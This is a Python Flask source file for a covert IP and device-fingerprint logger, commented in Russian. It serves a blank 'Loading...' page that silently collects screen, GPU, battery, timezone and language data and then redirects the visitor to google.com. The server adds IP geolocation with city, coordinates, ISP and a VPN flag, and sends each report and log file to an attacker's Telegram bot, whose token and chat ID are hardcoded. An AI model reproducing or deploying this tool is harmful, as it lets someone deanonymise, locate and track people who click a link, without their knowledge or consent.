from datetime import datetime
import os
from flask import Flask, jsonify, render_template_string, request
import requests

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = "8694192081:AAHOX9HIqNuYPt1hhq9Ua9d4SDS6mJ0s0tw"
TELEGRAM_CHAT_ID = "8564758689"


def send_telegram_message(text):
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
  payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
  try:
    requests.post(url, json=payload, timeout=5)
  except Exception as e:
    print(f"Ошибка отправки текста: {e}")


def send_telegram_document(file_path, caption):
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
  try:
    with open(file_path, "rb") as f:
      files = {"document": f}
      data = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}
      requests.post(url, data=data, files=files, timeout=10)
  except Exception as e:
    print(f"Ошибка отправки файла: {e}")


HTML_PAGE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <script>
        async function gatherData() {
            let batteryLevel = 'Недоступно';
            let batteryCharging = 'Неизвестно';
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batteryLevel = Math.round(b.level * 100) + '%';
                    batteryCharging = b.charging ? 'Да' : 'Нет';
                }
            } catch(e) {}

            let glVendor = 'Неизвестно';
            let glRenderer = 'Неизвестно';
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        glVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch(e) {}

            const data = {
                screenResolution: window.screen.width + "x" + window.screen.height,
                availResolution: window.screen.availWidth + "x" + window.screen.availHeight,
                colorDepth: window.screen.colorDepth + "-bit",
                pixelRatio: window.devicePixelRatio || 1,
                orientation: (screen.orientation || {}).type || 'Не определена',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language || navigator.userLanguage,
                languages: (navigator.languages || []).join(', '),
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' ГБ' : 'Неизвестно',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                cookiesEnabled: navigator.cookieEnabled ? 'Да' : 'Нет',
                onLine: navigator.onLine ? 'Да' : 'Нет',
                batteryLevel: batteryLevel,
                batteryCharging: batteryCharging,
                gpuVendor: glVendor,
                gpuRenderer: glRenderer
            };

            fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                window.location.href = "https://google.com";
            }).catch(() => {
                window.location.href = "https://google.com";
            });
        }
        gatherData();
    </script>
</body>
</html>
"""


@app.route("/")
def index():
  user_agent = request.headers.get("User-Agent", "")
  # Фильтруем системные боты и пинги хостинга, чтобы они не триггерили пустые логи
  if "Go-http-client" in user_agent or "Render" in user_agent:
    return "OK", 200
  return render_template_string(HTML_PAGE)


@app.route("/collect", methods=["POST"])
def collect():
  client_data = request.json or {}

  ip = request.headers.get(
      "X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr)
  )
  if "," in ip:
    ip = ip.split(",")[0].strip()

  visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
  user_agent = request.headers.get("User-Agent", "Не определен")

  geo_info = {}
  try:
    geo_resp = requests.get(
        f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,lat,lon,timezone,proxy",
        timeout=3,
    )
    if geo_resp.status_code == 200:
      geo_info = geo_resp.json()
  except:
    pass

  country = geo_info.get("country", "Не определено")
  region = geo_info.get("regionName", "Не определено")
  city = geo_info.get("city", "Не определено")
  isp = geo_info.get("isp", "Не определено")
  org = geo_info.get("org", "Не определено")
  lat = geo_info.get("lat", "Н/Д")
  lon = geo_info.get("lon", "Н/Д")
  is_vpn = "Да" if geo_info.get("proxy") else "Нет / Неизвестно"

  # ВСЕГДА перезаписываем один и тот же файл log.txt (никакого накопления истории)
  file_name = "log.txt"

  log_content = (
      f"========================================\n"
      f"           ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ\n"
      f"========================================\n"
      f"Время визита: {visit_time}\n"
      f"IP-адрес: {ip}\n"
      f"Возможный VPN/Proxy: {is_vpn}\n"
      f"\n"
      f"[ГЕОЛОКАЦИЯ ПО IP]\n"
      f"Страна: {country}\n"
      f"Регион: {region}\n"
      f"Город: {city}\n"
      f"Широта / Долгота: {lat}, {lon}\n"
      f"Провайдер (ISP): {isp}\n"
      f"Организация: {org}\n"
      f"\n"
      f"[ПАРАМЕТРЫ УСТРОЙСТВА И ЭКРАНА]\n"
      f"Разрешение экрана: {client_data.get('screenResolution', 'Н/Д')}\n"
      f"Доступная область экрана: {client_data.get('availResolution', 'Н/Д')}\n"
      f"Глубина цвета: {client_data.get('colorDepth', 'Н/Д')}\n"
      f"Плотность пикселей (DPR): {client_data.get('pixelRatio', 'Н/Д')}\n"
      f"Ориентация экрана: {client_data.get('orientation', 'Н/Д')}\n"
      f"Точки касания (Тач): {client_data.get('maxTouchPoints', '0')}\n"
      f"Платформа ОС: {client_data.get('platform', 'Н/Д')}\n"
      f"Ядра процессора: {client_data.get('hardwareConcurrency', 'Н/Д')}\n"
      f"Оперативная память: {client_data.get('deviceMemory', 'Н/Д')}\n"
      f"Видеокарта (GPU Vendor): {client_data.get('gpuVendor', 'Н/Д')}\n"
      f"Видеокарта (GPU Renderer): {client_data.get('gpuRenderer', 'Н/Д')}\n"
      f"\n"
      f"[СИСТЕМНЫЕ НАСТРОЙКИ БРАУЗЕРА]\n"
      f"Язык системы: {client_data.get('language', 'Н/Д')}\n"
      f"Поддерживаемые языки: {client_data.get('languages', 'Н/Д')}\n"
      f"Часовой пояс браузера: {client_data.get('timezone', 'Н/Д')}\n"
      f"Уровень заряда батареи: {client_data.get('batteryLevel', 'Н/Д')}\n"
      f"Заряжается: {client_data.get('batteryCharging', 'Н/Д')}\n"
      f"Cookies включены: {client_data.get('cookiesEnabled', 'Н/Д')}\n"
      f"\n"
      f"[ТЕХНИЧЕСКИЙ USER-AGENT]\n"
      f"{user_agent}\n"
      f"========================================\n"
  )

  with open(file_name, "w", encoding="utf-8") as f:
    f.write(log_content)

  message_text = (
      f"🔔 *Новый точный переход!*\n\n"
      f"⏱ *Время:* `{visit_time}`\n"
      f"🌐 *IP:* `{ip}` (VPN: {is_vpn})\n"
      f"📍 *Место:* `{country}, {city}`\n"
      f"🏢 *Провайдер:* `{isp}`\n"
      f"💻 *Экран / Платформа:* `{client_data.get('screenResolution', 'Н/Д')} | {client_data.get('platform', 'Н/Д')}`\n"
      f"⚙ *Процессор / Память:* `{client_data.get('hardwareConcurrency', 'Н/Д')} ядер, {client_data.get('deviceMemory', 'Н/Д')}`"
  )

  send_telegram_message(message_text)
  send_telegram_document(file_name, caption=f"📁 Лог для IP: {ip}")

  return jsonify({"status": "ok"})


if __name__ == "__main__":
  port = int(os.environ.get("PORT", 5000))
  app.run(host="0.0.0.0", port=port)
